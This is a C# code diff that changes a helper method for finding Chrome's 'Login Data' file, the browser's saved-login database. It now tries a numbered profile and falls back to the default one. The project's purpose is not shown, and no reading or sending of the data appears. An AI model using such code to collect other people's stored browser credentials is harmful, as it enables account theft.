@@ -12,8 +12,18 @@
 
         public static string GetLoginDataFile()
         {
-            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            string s1 =  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
     "Google", "Chrome", "User Data", "profile 6", "Login Data");
+
+            if(File.Exists(s1))
+            {
+                return s1;
+            }
+            else
+            {
+                return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+    "Google", "Chrome", "User Data", "default", "Login Data");
+            }
         }
     }
 }
